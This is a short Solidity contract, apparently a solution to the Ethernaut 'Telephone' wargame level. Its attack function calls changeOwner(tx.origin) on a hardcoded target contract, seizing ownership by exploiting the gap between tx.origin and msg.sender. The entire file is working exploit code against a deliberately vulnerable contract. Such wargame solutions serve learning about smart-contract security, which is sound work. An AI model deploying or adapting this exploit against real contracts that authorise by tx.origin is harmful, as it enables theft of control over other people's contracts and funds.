// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

interface ITelephone {
    function changeOwner(address _owner) external;
}

contract AttackTelephone {
    ITelephone public telephone;

    constructor() public {
        telephone = ITelephone(0x53D9a22620009f7cC4094aecdC382ddEdF96290C);
    }

    function attack() public {
        telephone.changeOwner(tx.origin);
    }
}
